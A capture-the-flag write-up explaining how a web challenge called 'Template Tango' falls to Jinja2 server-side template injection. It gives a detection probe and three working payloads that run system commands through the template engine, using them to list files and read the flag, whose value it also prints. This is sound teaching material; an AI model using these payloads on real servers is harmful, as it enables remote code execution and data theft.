# Template Tango writeup

when we first open the web page we are introduced with an input box and a submit , when we enter our name we are redirected to a page saying `Welcome our_input`

we notice that the name starts with Template hinting that it may be the very common vulnerability `Server side template injection` aka `ssti`

w try puting the common payload for detecting an ssti (payload is the malicious input you use to break a webpage)
`{{7*7}}` when we hit submit we get `Welcome 49` which means `7*7` got interpreted as code 

i recommend you read more about SSTI vulnerability in this [Hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) webpage .

when we identified that there is a jinja2 SSTI (flask ssti) we can use [payloads of all things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) to get a straight forward payload that gives us access to execute system commands on the server also known as `RCE` (remote code execution) \
i recommend using one of these three payloads as you dont need to find the index of a class 
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```

we try the first payload with the command `ls` and BAAM , we got the name of our flag `flag118401.txt` 
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}
```

we can then just change the `ls` with `cat flag118401.txt` getting our flag which is `Securinets{T3mpl8_Exploit0r}`

written by : **Chuuya**